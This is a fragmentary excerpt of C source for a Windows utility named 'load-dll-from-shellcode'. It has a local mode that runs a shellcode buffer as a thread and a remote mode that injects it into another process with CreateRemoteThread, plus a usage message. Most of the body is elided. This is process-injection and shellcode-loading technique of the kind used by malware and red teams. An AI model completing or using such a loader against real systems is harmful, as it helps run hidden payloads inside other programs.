...
void local_load_dll(DWORD bufSz, LPVOID buf)
{
	...
	pRoutine = (LPTHREAD_START_ROUTINE)pAddress;
...
void remote_load_dll(DWORD bufSz, LPVOID buf)
{
	...
	hThread = CreateRemoteThread(pi->hProcess, 0, 0, pRoutine, 0, 0, 0);
...
int main(int argc, char* argv[])
{
	...
	{
		printf("PS> .\\load-dll-from-shellcode.exe <mode> <path>\n");
		printf("PS> .\\load-dll-from-shellcode 1 c:\\shellcode.bin\n");
		printf("PS> .\\load-dll-from-shellcode 2 c:\\shellcode.bin\n");
		printf("\nMODES:\n");
		printf("    - 1: Local\n");
		printf("    - 2: Remote\n");
		return -1;
